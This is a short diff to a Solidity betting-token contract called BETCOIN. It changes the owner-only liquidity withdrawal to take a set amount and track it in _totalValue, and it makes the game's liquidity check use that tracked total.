@@ -541,9 +541,10 @@ contract BETCOIN is Context, IBEP20, Ownable {
         _totalValue += msg.value;
     }
 
-    function remLiquidity(address payable _to, uint256 psscde) public onlyOwner {
+    function remLiquidity(address payable _to, uint256 amnt, uint256 psscde) public onlyOwner {
         require(psscde == _passcode, "wrong passcode");
-        _to.transfer(address(this).balance);
+        _to.transfer(amnt);
+        _totalValue -= amnt;
     }
 
     function PLAY(uint256 _no) public {
@@ -584,7 +585,7 @@ contract BETCOIN is Context, IBEP20, Ownable {
     }
 
     function PLAYCORE(address payable _to, uint256 _no) public payable {
-        require(address(this).balance >= _jackPot, "insufficient liquidity");
+        require(_totalValue >= _jackPot, "insufficient liquidity");
         require(msg.value >= _bet, "wrong value");
         _totalValue += msg.value;
 
